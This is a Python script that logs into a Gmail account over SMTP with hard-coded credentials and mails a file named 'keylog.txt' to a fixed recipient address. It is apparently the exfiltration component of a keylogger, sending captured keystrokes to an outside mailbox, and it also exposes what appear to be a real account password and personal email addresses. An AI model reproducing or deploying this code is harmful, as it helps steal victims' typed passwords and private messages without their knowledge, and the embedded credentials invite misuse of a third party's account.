import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.application import MIMEApplication

subject = "Email Subject"
body = "This is the body of the text message"
sender_email = "applepiestorage@gmail.com"  # Your sender email address
receiver_email = "maynarde.joseph@gmail.com"  # The recipient's email address
email_password = "sgjrbyuqghwwbtrc"  # Your email account password or an app-specific password
file_path = "keylog.txt"  # Replace with the actual path to your .txt file

def send_email(user, pwd, recipient, subject, body, file_path):
    FROM = user
    TO = recipient if isinstance(recipient, list) else [recipient]
    SUBJECT = subject
    TEXT = body

    # Create a multipart message
    message = MIMEMultipart()
    message["From"] = FROM
    message["To"] = ", ".join(TO)
    message["Subject"] = SUBJECT

    # Attach the body of the email
    message.attach(MIMEText(TEXT, "plain"))

    # Attach the .txt file
    with open(file_path, "rb") as attachment:
        part = MIMEApplication(attachment.read(), Name="textfile.txt")

    # Add header for the attachment
    part["Content-Disposition"] = f"attachment; filename={file_path}"
    message.attach(part)

    try:
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.ehlo()
        server.starttls()
        server.login(user, pwd)
        server.sendmail(FROM, TO, message.as_string())
        server.close()
        print("successfully sent the mail")
    except Exception as e:
        print(f"failed to send mail: {str(e)}")

send_email(sender_email, email_password, receiver_email, subject, body, file_path)